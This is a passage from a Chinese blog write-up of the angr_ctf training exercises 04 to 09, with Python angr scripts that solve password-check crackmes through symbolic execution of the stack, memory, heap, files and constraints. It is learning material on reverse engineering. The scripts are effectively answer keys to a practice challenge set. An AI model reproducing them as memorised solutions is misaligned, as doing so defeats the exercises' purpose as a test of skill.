class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for the symbolic values. If there are multiple solutions, we only</span></span><br><span class="line">    <span class="comment"># care about one, so we can use eval, which returns any (but only one)</span></span><br><span class="line">    <span class="comment"># solution. Pass eval the bitvector you want to solve for.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">    solution2 = solution_state.solver.<span class="built_in">eval</span>(password2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Aggregate and format the solutions you computed above, and then print</span></span><br><span class="line">    <span class="comment"># the full string. Pay attention to the order of the integers, and the</span></span><br><span class="line">    <span class="comment"># expected base (decimal, octal, hexadecimal, etc).</span></span><br><span class="line">    solution = <span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>, [ solution0, solution1, solution2 ]))  <span class="comment"># :string</span></span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<h4 id="04_angr_symbolic_stack"><a class="markdownIt-Anchor" href="#04_angr_symbolic_stack">#</a> 04_angr_symbolic_stack</h4>
<p>老 exp 还是可以打通… 不过官方 exp 是要求把栈模拟一下的，贴一下先</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This challenge will be more challenging than the previous challenges that you</span></span><br><span class="line"><span class="comment"># have encountered thus far. Since the goal of this CTF is to teach symbolic</span></span><br><span class="line"><span class="comment"># execution and not how to construct stack frames, these comments will work you</span></span><br><span class="line"><span class="comment"># through understanding what is on the stack.</span></span><br><span class="line"><span class="comment">#   ! ! !</span></span><br><span class="line"><span class="comment"># IMPORTANT: Any addresses in this script aren&#x27;t necessarily right! Dissassemble</span></span><br><span class="line"><span class="comment">#            the binary yourself to determine the correct addresses!</span></span><br><span class="line"><span class="comment">#   ! ! !</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># For this challenge, we want to begin after the call to scanf. Note that this</span></span><br><span class="line">  <span class="comment"># is in the middle of a function.</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># This challenge requires dealing with the stack, so you have to pay extra</span></span><br><span class="line">  <span class="comment"># careful attention to where you start, otherwise you will enter a condition</span></span><br><span class="line">  <span class="comment"># where the stack is set up incorrectly. In order to determine where after</span></span><br><span class="line">  <span class="comment"># scanf to start, we need to look at the dissassembly of the call and the</span></span><br><span class="line">  <span class="comment"># instruction immediately following it:</span></span><br><span class="line">  <span class="comment">#   sub    $0x4,%esp</span></span><br><span class="line">  <span class="comment">#   lea    -0x10(%ebp),%eax</span></span><br><span class="line">  <span class="comment">#   push   %eax</span></span><br><span class="line">  <span class="comment">#   lea    -0xc(%ebp),%eax</span></span><br><span class="line">  <span class="comment">#   push   %eax</span></span><br><span class="line">  <span class="comment">#   push   $0x80489c3</span></span><br><span class="line">  <span class="comment">#   call   8048370 &lt;__isoc99_scanf@plt&gt;</span></span><br><span class="line">  <span class="comment">#   add    $0x10,%esp</span></span><br><span class="line">  <span class="comment"># Now, the question is: do we start on the instruction immediately following</span></span><br><span class="line">  <span class="comment"># scanf (add $0x10,%esp), or the instruction following that (not shown)?</span></span><br><span class="line">  <span class="comment"># Consider what the &#x27;add $0x10,%esp&#x27; is doing. Hint: it has to do with the</span></span><br><span class="line">  <span class="comment"># scanf parameters that are pushed to the stack before calling the function.</span></span><br><span class="line">  <span class="comment"># Given that we are not calling scanf in our Angr simulation, where should we</span></span><br><span class="line">  <span class="comment"># start?</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  start_address = <span class="number">0x80486ae</span></span><br><span class="line">  initial_state = project.factory.blank_state(</span><br><span class="line">    addr=start_address,</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment"># We are jumping into the middle of a function! Therefore, we need to account</span></span><br><span class="line">  <span class="comment"># for how the function constructs the stack. The second instruction of the</span></span><br><span class="line">  <span class="comment"># function is:</span></span><br><span class="line">  <span class="comment">#   mov    %esp,%ebp</span></span><br><span class="line">  <span class="comment"># At which point it allocates the part of the stack frame we plan to target:</span></span><br><span class="line">  <span class="comment">#   sub    $0x18,%esp</span></span><br><span class="line">  <span class="comment"># Note the value of esp relative to ebp. The space between them is (usually)</span></span><br><span class="line">  <span class="comment"># the stack space. Since esp was decreased by 0x18</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment">#        /-------- The stack --------\</span></span><br><span class="line">  <span class="comment"># ebp -&gt; |                           |</span></span><br><span class="line">  <span class="comment">#        |---------------------------|</span></span><br><span class="line">  <span class="comment">#        |                           |</span></span><br><span class="line">  <span class="comment">#        |---------------------------|</span></span><br><span class="line">  <span class="comment">#         . . . (total of 0x18 bytes)</span></span><br><span class="line">  <span class="comment">#         . . . Somewhere in here is</span></span><br><span class="line">  <span class="comment">#         . . . the data that stores</span></span><br><span class="line">  <span class="comment">#         . . . the result of scanf.</span></span><br><span class="line">  <span class="comment"># esp -&gt; |                           |</span></span><br><span class="line">  <span class="comment">#        \---------------------------/</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Since we are starting after scanf, we are skipping this stack construction</span></span><br><span class="line">  <span class="comment"># step. To make up for this, we need to construct the stack ourselves. Let us</span></span><br><span class="line">  <span class="comment"># start by initializing ebp in the exact same way the program does.</span></span><br><span class="line">  initial_state.regs.ebp = initial_state.regs.esp</span><br><span class="line"></span><br><span class="line">  <span class="comment"># scanf(&quot;%u %u&quot;) needs to be replaced by injecting two bitvectors. The</span></span><br><span class="line">  <span class="comment"># reason for this is that Angr does not (currently) automatically inject</span></span><br><span class="line">  <span class="comment"># symbols if scanf has more than one input parameter. This means Angr can</span></span><br><span class="line">  <span class="comment"># handle &#x27;scanf(&quot;%u&quot;)&#x27;, but not &#x27;scanf(&quot;%u %u&quot;)&#x27;.</span></span><br><span class="line">  <span class="comment"># You can either copy and paste the line below or use a Python list.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Here is the hard part. We need to figure out what the stack looks like, at</span></span><br><span class="line">  <span class="comment"># least well enough to inject our symbols where we want them. In order to do</span></span><br><span class="line">  <span class="comment"># that, let&#x27;s figure out what the parameters of scanf are:</span></span><br><span class="line">  <span class="comment">#   sub    $0x4,%esp</span></span><br><span class="line">  <span class="comment">#   lea    -0x10(%ebp),%eax</span></span><br><span class="line">  <span class="comment">#   push   %eax</span></span><br><span class="line">  <span class="comment">#   lea    -0xc(%ebp),%eax</span></span><br><span class="line">  <span class="comment">#   push   %eax</span></span><br><span class="line">  <span class="comment">#   push   $0x80489c3</span></span><br><span class="line">  <span class="comment">#   call   8048370 &lt;__isoc99_scanf@plt&gt;</span></span><br><span class="line">  <span class="comment">#   add    $0x10,%esp </span></span><br><span class="line">  <span class="comment"># As you can see, the call to scanf looks like this:</span></span><br><span class="line">  <span class="comment"># scanf(  0x80489c3,   ebp - 0xc,   ebp - 0x10  )</span></span><br><span class="line">  <span class="comment">#      format_string    password0    password1</span></span><br><span class="line">  <span class="comment">#  From this, we can construct our new, more accurate stack diagram:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment">#            /-------- The stack --------\</span></span><br><span class="line">  <span class="comment"># ebp -&gt;     |          padding          |</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment"># ebp - 0x01 |       more padding        |</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment"># ebp - 0x02 |     even more padding     |</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment">#                        . . .               &lt;- How much padding? Hint: how</span></span><br><span class="line">  <span class="comment">#            |---------------------------|      many bytes is password0?</span></span><br><span class="line">  <span class="comment"># ebp - 0x0b |   password0, second byte  |</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment"># ebp - 0x0c |   password0, first byte   |</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment"># ebp - 0x0d |   password1, last byte    |</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment">#                        . . .</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment"># ebp - 0x10 |   password1, first byte   |</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment">#                        . . .</span></span><br><span class="line">  <span class="comment">#            |---------------------------|</span></span><br><span class="line">  <span class="comment"># esp -&gt;     |                           |</span></span><br><span class="line">  <span class="comment">#            \---------------------------/</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Figure out how much space there is and allocate the necessary padding to</span></span><br><span class="line">  <span class="comment"># the stack by decrementing esp before you push the password bitvectors.</span></span><br><span class="line">  padding_length_in_bytes = <span class="number">8</span>  <span class="comment"># :integer</span></span><br><span class="line">  initial_state.regs.esp -= padding_length_in_bytes</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Push the variables to the stack. Make sure to push them in the right order!</span></span><br><span class="line">  <span class="comment"># The syntax for the following function is:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># initial_state.stack_push(bitvector)</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># This will push the bitvector on the stack, and increment esp the correct</span></span><br><span class="line">  <span class="comment"># amount. You will need to push multiple bitvectors on the stack.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state.stack_push(password0)  <span class="comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span></span><br><span class="line">  initial_state.stack_push(password1)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line"></span><br><span class="line">    solution = <span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, [ solution0, solution1 ]))</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<p>分析一下：</p>
<p>主要是这里：</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231024162621516.png" alt="image-20231024162621516"></p>
<p>实际上就是找到栈上的参数，用于做初始化状态，再进行符号执行</p>
<h4 id="05_angr_symbolic_memory"><a class="markdownIt-Anchor" href="#05_angr_symbolic_memory">#</a> 05_angr_symbolic_memory</h4>
<p>对应到全局变量的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">start_address = <span class="number">0x8049299</span></span><br><span class="line">initial_state = proj.factory.blank_state(</span><br><span class="line">  addr=start_address,</span><br><span class="line">  add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                  angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">password3 = claripy.BVS(<span class="string">&#x27;password3&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">password0_address = <span class="number">0xBFA1EE0</span></span><br><span class="line">initial_state.memory.store(password0_address, password0)</span><br><span class="line">password1_address = <span class="number">0xBFA1EE0</span> + <span class="number">8</span></span><br><span class="line">initial_state.memory.store(password1_address, password1)</span><br><span class="line">password2_address = <span class="number">0xBFA1EE0</span> + <span class="number">16</span></span><br><span class="line">initial_state.memory.store(password2_address, password2)</span><br><span class="line">password3_address = <span class="number">0xBFA1EE0</span> + <span class="number">24</span></span><br><span class="line">initial_state.memory.store(password3_address, password3)</span><br><span class="line"></span><br><span class="line">simgr = proj.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line">      </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line">    </span><br><span class="line">simgr.explore(find = is_successful, avoid = should_abort)</span><br><span class="line">solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">solution0 = solution_state.solver.<span class="built_in">eval</span>(password0,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">solution1 = solution_state.solver.<span class="built_in">eval</span>(password1,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">solution2 = solution_state.solver.<span class="built_in">eval</span>(password2,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">solution3 = solution_state.solver.<span class="built_in">eval</span>(password3,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">solution = <span class="string">&#x27; &#x27;</span>.join([ solution0, solution1, solution2, solution3 ])</span><br><span class="line"><span class="built_in">print</span>(solution)</span><br></pre></td></tr></table></figure>
<h4 id="06_angr_symbolic_dynamic_memory"><a class="markdownIt-Anchor" href="#06_angr_symbolic_dynamic_memory">#</a> 06_angr_symbolic_dynamic_memory</h4>
<p><s>最早的仍旧能打通</s></p>
<p>不过这题主要还是教你把堆模拟（分配未分配过的内存即可）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_heap_address0 = <span class="number">0x4444444</span></span><br><span class="line">pointer_to_malloc_memory_address0 = <span class="number">0xa2def74</span></span><br><span class="line">initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness, size=<span class="number">4</span>)</span><br><span class="line">fake_heap_address1 = <span class="number">0x4444454</span></span><br><span class="line">pointer_to_malloc_memory_address1 = <span class="number">0xa2def7c</span></span><br><span class="line">initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness, size=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Store our symbolic values at our fake_heap_address. Look at the binary to</span></span><br><span class="line"><span class="comment"># determine the offsets from the fake_heap_address where scanf writes.</span></span><br><span class="line"><span class="comment"># (!)</span></span><br><span class="line">initial_state.memory.store(fake_heap_address0, password0)</span><br><span class="line">initial_state.memory.store(fake_heap_address1, password1)</span><br></pre></td></tr></table></figure>
<h4 id="07_angr_symbolic_file"><a class="markdownIt-Anchor" href="#07_angr_symbolic_file">#</a> 07_angr_symbolic_file</h4>
<p><s>最早的仍旧能打通，而且官方的反而打不通 ee</s></p>
<p>还是贴一个官方的吧，其实就是教怎么模拟文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This challenge could, in theory, be solved in multiple ways. However, for the</span></span><br><span class="line"><span class="comment"># sake of learning how to simulate an alternate filesystem, please solve this</span></span><br><span class="line"><span class="comment"># challenge according to structure provided below. As a challenge, once you have</span></span><br><span class="line"><span class="comment"># an initial solution, try solving this in an alternate way.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Problem description and general solution strategy:</span></span><br><span class="line"><span class="comment"># The binary loads the password from a file using the fread function. If the</span></span><br><span class="line"><span class="comment"># password is correct, it prints &quot;Good Job.&quot; In order to keep consistency with</span></span><br><span class="line"><span class="comment"># the other challenges, the input from the console is written to a file in the </span></span><br><span class="line"><span class="comment"># ignore_me function. As the name suggests, ignore it, as it only exists to</span></span><br><span class="line"><span class="comment"># maintain consistency with other challenges.</span></span><br><span class="line"><span class="comment"># We want to:</span></span><br><span class="line"><span class="comment"># 1. Determine the file from which fread reads.</span></span><br><span class="line"><span class="comment"># 2. Use Angr to simulate a filesystem where that file is replaced with our own</span></span><br><span class="line"><span class="comment">#    simulated file.</span></span><br><span class="line"><span class="comment"># 3. Initialize the file with a symbolic value, which will be read with fread</span></span><br><span class="line"><span class="comment">#    and propogated through the program.</span></span><br><span class="line"><span class="comment"># 4. Solve for the symbolic input to determine the password.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x80488bc</span></span><br><span class="line">  initial_state = project.factory.blank_state(</span><br><span class="line">    addr=start_address,</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Specify some information needed to construct a simulated file. For this</span></span><br><span class="line">  <span class="comment"># challenge, the filename is hardcoded, but in theory, it could be symbolic. </span></span><br><span class="line">  <span class="comment"># Note: to read from the file, the binary calls</span></span><br><span class="line">  <span class="comment"># &#x27;fread(buffer, sizeof(char), 64, file)&#x27;.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  filename = <span class="string">&#x27;FOQVSBZB.txt&#x27;</span>  <span class="comment"># :string</span></span><br><span class="line">  symbolic_file_size_bytes = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Construct a bitvector for the password and then store it in the file&#x27;s</span></span><br><span class="line">  <span class="comment"># backing memory. For example, imagine a simple file, &#x27;hello.txt&#x27;:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Hello world, my name is John.</span></span><br><span class="line">  <span class="comment"># ^                       ^</span></span><br><span class="line">  <span class="comment"># ^ address 0             ^ address 24 (count the number of characters)</span></span><br><span class="line">  <span class="comment"># In order to represent this in memory, we would want to write the string to</span></span><br><span class="line">  <span class="comment"># the beginning of the file:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># hello_txt_contents = claripy.BVV(&#x27;Hello world, my name is John.&#x27;, 30*8)</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Perhaps, then, we would want to replace John with a</span></span><br><span class="line">  <span class="comment"># symbolic variable. We would call:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># name_bitvector = claripy.BVS(&#x27;symbolic_name&#x27;, 4*8)</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Then, after the program calls fopen(&#x27;hello.txt&#x27;, &#x27;r&#x27;) and then</span></span><br><span class="line">  <span class="comment"># fread(buffer, sizeof(char), 30, hello_txt_file), the buffer would contain</span></span><br><span class="line">  <span class="comment"># the string from the file, except four symbolic bytes where the name would be</span></span><br><span class="line">  <span class="comment"># stored.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, symbolic_file_size_bytes * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Construct the symbolic file. The file_options parameter specifies the Linux</span></span><br><span class="line">  <span class="comment"># file permissions (read, read/write, execute etc.) The content parameter</span></span><br><span class="line">  <span class="comment"># specifies from where the stream of data should be supplied. If content is</span></span><br><span class="line">  <span class="comment"># an instance of SimSymbolicMemory (we constructed one above), the stream will</span></span><br><span class="line">  <span class="comment"># contain the contents (including any symbolic contents) of the memory,</span></span><br><span class="line">  <span class="comment"># beginning from address zero.</span></span><br><span class="line">  <span class="comment"># Set the content parameter to our BVS instance that holds the symbolic data.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password_file = angr.storage.SimFile(filename, content=password)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># Add the symbolic file we created to the symbolic filesystem.</span></span><br><span class="line">  initial_state.fs.insert(filename, password_file)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution = solution_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<p>ps. 找到 issue 了：</p>
<p>Scaffold and solution challenge 07 are not working with latest angr, because SimFile class changed.</p>
<p>This is working code with latest version of angr for the filesystem part:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename = &quot;OJKSQYDP.txt&quot;  # :string</span><br><span class="line">symbolic_file_size_bytes = 64</span><br><span class="line"></span><br><span class="line">password = claripy.BVS(&#x27;password&#x27;, symbolic_file_size_bytes * 8)</span><br><span class="line">password_file = angr.storage.SimFile(filename, content=password, size=symbolic_file_size_bytes)</span><br><span class="line"></span><br><span class="line">initial_state.fs.insert(filename, password_file)</span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br></pre></td></tr></table></figure>
<p>TODO：改了 issue 仍旧打不通</p>
<h4 id="08_angr_constraints"><a class="markdownIt-Anchor" href="#08_angr_constraints">#</a> 08_angr_constraints</h4>
<p><s>老 exp 打不通了，好耶（什）</s></p>
<p>原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># While you, as a human, can easily determine that this function is equivalent</span><br><span class="line"># to simply comparing the strings, the computer cannot. Instead the computer </span><br><span class="line"># would need to branch every time the if statement in the loop was called (16 </span><br><span class="line"># times), resulting in 2^16 = 65,536 branches, which will take too long of a </span><br><span class="line"># time to evaluate for our needs.</span><br></pre></td></tr></table></figure>
<p>TODO：这里尝试过在 check 的 jnz 地址处对 zf 寄存器状态做剪枝，也跑不出来，后续看看为啥</p>
<p>官方给的解法是手动获取模拟比较（设置终止状态在真正的 check 之前，然后手动设置比较），将其转化为 constraint，约束求解得到最终结果，贴一个吧先：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x80492ED</span></span><br><span class="line">  initial_state = project.factory.blank_state(</span><br><span class="line">    addr=start_address,</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">  password_address = <span class="number">0x804C034</span></span><br><span class="line">  initial_state.memory.store(password_address, password)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  address_to_check_constraint = <span class="number">0x804933E</span></span><br><span class="line">  simulation.explore(find=address_to_check_constraint)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    constrained_parameter_address = <span class="number">0x804C034</span></span><br><span class="line">    constrained_parameter_size_bytes = <span class="number">16</span></span><br><span class="line">    constrained_parameter_bitvector = solution_state.memory.load(</span><br><span class="line">      constrained_parameter_address,</span><br><span class="line">      constrained_parameter_size_bytes</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    constrained_parameter_desired_value = <span class="string">&#x27;PPBVDNMJABAQHZQQ&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)</span><br><span class="line"></span><br><span class="line">    solution = solution_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<h4 id="09_angr_hooks"><a class="markdownIt-Anchor" href="#09_angr_hooks">#</a> 09_angr_hooks</h4>
<p><s>他说要 hook，但是我强行给他分段打通楽（什）</s></p>
<p>一开始写的 exp（注意给 password 初始值写上，开始的时候忘了）可以打通</p>
